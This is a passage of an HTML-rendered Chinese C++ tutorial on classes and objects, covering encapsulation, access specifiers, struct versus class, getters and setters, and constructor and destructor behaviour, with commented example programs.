class="hljs-type">void</span> <span class="hljs-title">showStudent</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;name:&quot;</span> &lt;&lt; m_name &lt;&lt; <span class="hljs-string">&quot; ID:&quot;</span> &lt;&lt; m_id &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br>string m_name;<br><span class="hljs-type">int</span> m_id;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>Student stu;<br>stu.<span class="hljs-built_in">setName</span>(<span class="hljs-string">&quot;德玛西亚&quot;</span>);<br>stu.<span class="hljs-built_in">setID</span>(<span class="hljs-number">250</span>);<br>stu.<span class="hljs-built_in">showStudent</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>封装意义二：</strong></p><p>类在设计时，可以把属性和行为放在不同的权限下，加以控制</p><p>访问权限有三种：</p><ol><li>public        公共权限  </li><li>protected 保护权限</li><li>private      私有权限</li></ol><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//三种权限</span><br><span class="hljs-comment">//公共权限  public     类内可以访问  类外可以访问</span><br><span class="hljs-comment">//保护权限  protected  类内可以访问  类外不可以访问</span><br><span class="hljs-comment">//私有权限  private    类内可以访问  类外不可以访问</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-comment">//姓名  公共权限</span><br><span class="hljs-keyword">public</span>:<br>string m_Name;<br><br><span class="hljs-comment">//汽车  保护权限</span><br><span class="hljs-keyword">protected</span>:<br>string m_Car;<br><br><span class="hljs-comment">//银行卡密码  私有权限</span><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_Password;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>m_Name = <span class="hljs-string">&quot;张三&quot;</span>;<br>m_Car = <span class="hljs-string">&quot;拖拉机&quot;</span>;<br>m_Password = <span class="hljs-number">123456</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>Person p;<br>p.m_Name = <span class="hljs-string">&quot;李四&quot;</span>;<br><span class="hljs-comment">//p.m_Car = &quot;奔驰&quot;;  //保护权限类外访问不到</span><br><span class="hljs-comment">//p.m_Password = 123; //私有权限类外访问不到</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-1-2-struct和class区别"><a href="#4-1-2-struct和class区别" class="headerlink" title="4.1.2 struct和class区别"></a>4.1.2 struct和class区别</h4><p>在C++中 struct和class唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p><p>区别：</p><ul><li>struct 默认权限为公共</li><li>class   默认权限为私有</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C1</span><br>&#123;<br><span class="hljs-type">int</span>  m_A; <span class="hljs-comment">//默认是私有权限</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">C2</span><br>&#123;<br><span class="hljs-type">int</span> m_A;  <span class="hljs-comment">//默认是公共权限</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>C1 c1;<br>c<span class="hljs-number">1.</span>m_A = <span class="hljs-number">10</span>; <span class="hljs-comment">//错误，访问权限是私有</span><br><br>C2 c2;<br>c<span class="hljs-number">2.</span>m_A = <span class="hljs-number">10</span>; <span class="hljs-comment">//正确，访问权限是公共</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-1-3-成员属性设置为私有"><a href="#4-1-3-成员属性设置为私有" class="headerlink" title="4.1.3 成员属性设置为私有"></a>4.1.3 成员属性设置为私有</h4><p>**优点1：**将所有成员属性设置为私有，可以自己控制读写权限</p><p>**优点2：**对于写权限，我们可以检测数据的有效性</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-comment">//姓名设置可读可写</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(string name)</span> </span>&#123;<br>m_Name = name;<br>&#125;<br><span class="hljs-function">string <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> m_Name;<br>&#125;<br><br><br><span class="hljs-comment">//获取年龄 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> m_Age;<br>&#125;<br><span class="hljs-comment">//设置年龄</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (age &lt; <span class="hljs-number">0</span> || age &gt; <span class="hljs-number">150</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;你个老妖精!&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>m_Age = age;<br>&#125;<br><br><span class="hljs-comment">//情人设置为只写</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setLover</span><span class="hljs-params">(string lover)</span> </span>&#123;<br>m_Lover = lover;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br>string m_Name; <span class="hljs-comment">//可读可写  姓名</span><br><br><span class="hljs-type">int</span> m_Age; <span class="hljs-comment">//只读  年龄</span><br><br>string m_Lover; <span class="hljs-comment">//只写  情人</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>Person p;<br><span class="hljs-comment">//姓名设置</span><br>p.<span class="hljs-built_in">setName</span>(<span class="hljs-string">&quot;张三&quot;</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;姓名： &quot;</span> &lt;&lt; p.<span class="hljs-built_in">getName</span>() &lt;&lt; endl;<br><br><span class="hljs-comment">//年龄设置</span><br>p.<span class="hljs-built_in">setAge</span>(<span class="hljs-number">50</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;年龄： &quot;</span> &lt;&lt; p.<span class="hljs-built_in">getAge</span>() &lt;&lt; endl;<br><br><span class="hljs-comment">//情人设置</span><br>p.<span class="hljs-built_in">setLover</span>(<span class="hljs-string">&quot;苍井&quot;</span>);<br><span class="hljs-comment">//cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  //只写属性，不可以读取</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-对象的初始化和清理"><a href="#4-2-对象的初始化和清理" class="headerlink" title="4.2 对象的初始化和清理"></a>4.2 对象的初始化和清理</h3><ul><li>生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全</li><li>C++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。</li></ul><h4 id="4-2-1-构造函数和析构函数"><a href="#4-2-1-构造函数和析构函数" class="headerlink" title="4.2.1 构造函数和析构函数"></a>4.2.1 构造函数和析构函数</h4><p>对象的<strong>初始化和清理</strong>也是两个非常重要的安全问题</p><ul><li><p>一个对象或者变量没有初始状态，对其使用后果是未知</p></li><li><p>同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题</p></li></ul><p>c++利用了<strong>构造函数</strong>和<strong>析构函数</strong>解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。</p><p>对象的初始化和清理工作是编译器强制要我们做的事情，因此如果<strong>我们不提供构造和析构，编译器会提供</strong></p><p><strong>编译器提供的构造函数和析构函数是空实现。</strong></p><ul><li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li><li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li></ul><p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p><ol><li>构造函数，没有返回值也不写void</li><li>函数名称与类名相同</li><li>构造函数可以有参数，因此可以发生重载</li><li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li></ol><p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p><ol><li>析构函数，没有返回值也不写void</li><li>函数名称与类名相同,在名称前加上符号  ~</li><li>析构函数不可以有参数，因此不可以发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//构造函数</span><br><span class="hljs-built_in">Person</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//析构函数</span><br>~<span class="hljs-built_in">Person</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Person p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-2-构造函数的分类及调用"><a href="#4-2-2-构造函数的分类及调用" class="headerlink" title="4.2.2 构造函数的分类及调用"></a>4.2.2 构造函数的分类及调用</h4><p>两种分类方式：</p><ul><li><p>按参数分为： 有参构造和无参构造</p></li><li><p>按类型分为： 普通构造和拷贝构造</p></li></ul><p>三种调用方式：</p><ul><li>括号法</li><li>显示法</li><li>隐式转换法</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//1、构造函数分类</span><br><span class="hljs-comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span><br><span class="hljs-comment">// 按照类型分类分为 普通构造和拷贝构造</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//无参（默认）构造函数</span><br><span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//有参构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a) &#123;<br>age = a;<br>cout &lt;&lt; <span class="hljs-string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//拷贝构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; p) &#123;<br>age = p.age;<br>cout &lt;&lt; <span class="hljs-string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//析构函数</span><br>~<span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-comment">//2、构造函数的调用</span><br><span class="hljs-comment">//调用无参构造函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br>Person p; <span class="hljs-comment">//调用无参构造函数</span><br>&#125;<br><br><span class="hljs-comment">//调用有参的构造函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//2.1  括号法，常用</span><br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span><br><span class="hljs-comment">//Person p2();</span><br><br><span class="hljs-comment">//2.2 显式法</span><br>Person p2 = <span class="hljs-built_in">Person</span>(<span class="hljs-number">10</span>); <br>Person p3 = <span class="hljs-built_in">Person</span>(p2);<br><span class="hljs-comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span><br><br><span class="hljs-comment">//2.3 隐式转换法</span><br>Person p4 = <span class="hljs-number">10</span>; <span class="hljs-comment">// Person p4 = Person(10); </span><br>Person p5 = p4; <span class="hljs-comment">// Person p5 = Person(p4); </span><br><br><span class="hljs-comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span><br><span class="hljs-comment">//Person p5(p4);</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><span class="hljs-comment">//test02();</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-3-拷贝构造函数调用时机"><a href="#4-2-3-拷贝构造函数调用时机" class="headerlink" title="4.2.3 拷贝构造函数调用时机"></a>4.2.3 拷贝构造函数调用时机</h4><p>C++中拷贝构造函数调用时机通常有三种情况</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;<br>mAge = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;<br>mAge = age;<br>&#125;<br><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; p) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;<br>mAge = p.mAge;<br>&#125;<br><span class="hljs-comment">//析构函数在释放内存之前调用</span><br>~<span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> mAge;<br>&#125;;<br><br><span class="hljs-comment">//1. 使用一个已经创建完毕的对象来初始化一个新对象</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-function">Person <span class="hljs-title">man</span><span class="hljs-params">(<span class="hljs-number">100</span>)</span></span>; <span class="hljs-comment">//p对象已经创建完毕</span><br><span class="hljs-function">Person <span class="hljs-title">newman</span><span class="hljs-params">(man)</span></span>; <span class="hljs-comment">//调用拷贝构造函数</span><br>Person newman2 = man; <span class="hljs-comment">//拷贝构造</span><br><br><span class="hljs-comment">//Person newman3;</span><br><span class="hljs-comment">//newman3 = man; //不是调用拷贝构造函数，赋值操作</span><br>&#125;<br><br><span class="hljs-comment">//2. 值传递的方式给函数参数传值</span><br><span class="hljs-comment">//相当于Person p1 = p;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doWork</span><span class="hljs-params">(Person p1)</span> </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span> </span>&#123;<br>Person p; <span class="hljs-comment">//无参构造函数</span><br><span class="hljs-built_in">doWork</span>(p);<br>&#125;<br><br><span class="hljs-comment">//3. 以值方式返回局部对象</span><br><span class="hljs-function">Person <span class="hljs-title">doWork2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Person p1;<br>cout &lt;&lt; (<span class="hljs-type">int</span> *)&amp;p1 &lt;&lt; endl;<br><span class="hljs-keyword">return</span> p1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test03</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Person p = <span class="hljs-built_in">doWork2</span>();<br>cout &lt;&lt; (<span class="hljs-type">int</span> *)&amp;p &lt;&lt; endl;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//test01();</span><br><span class="hljs-comment">//test02();</span><br><span class="hljs-built_in">test03</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-4-构造函数调用规则"><a href="#4-2-4-构造函数调用规则" class="headerlink" title="4.2.4 构造函数调用规则"></a>4.2.4 构造函数调用规则</h4><p>默认情况下，c++编译器至少给一个类添加3个函数</p><p>1．默认构造函数(无参，函数体为空)</p><p>2．默认析构函数(无参，函数体为空)</p><p>3．默认拷贝构造函数，对属性进行值拷贝</p><p>构造函数调用规则如下：</p><ul><li><p>如果用户定义有参构造函数，c++不在提供默认无参构造，但是会提供默认拷贝构造</p></li><li><p>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</p></li></ul><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//无参（默认）构造函数</span><br><span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//有参构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a) &#123;<br>age = a;<br>cout &lt;&lt; <span class="hljs-string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//拷贝构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; p) &#123;<br>age = p.age;<br>cout &lt;&lt; <span class="hljs-string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//析构函数</span><br>~<span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-comment">//如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作</span><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;p2的年龄为： &quot;</span> &lt;&lt; p<span class="hljs-number">2.</span>age &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造</span><br>Person p1; <span class="hljs-comment">//此时如果用户自己没有提供默认构造，会出错</span><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>; <span class="hljs-comment">//用户提供的有参</span><br><span class="hljs-function">Person <span class="hljs-title">p3</span><span class="hljs-params">(p2)</span></span>; <span class="hljs-comment">//此时如果用户没有提供拷贝构造，编译器会提供</span><br><br><span class="hljs-comment">//如果用户提供拷贝构造，编译器不会提供其他构造函数</span><br>Person p4; <span class="hljs-comment">//此时如果用户自己没有提供默认构造，会出错</span><br><span class="hljs-function">Person <span class="hljs-title">p5</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>; <span class="hljs-comment">//此时如果用户自己没有提供有参，会出错</span><br><span class="hljs-function">Person <span class="hljs-title">p6</span><span class="hljs-params">(p5)</span></span>; <span class="hljs-comment">//用户自己提供拷贝构造</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span 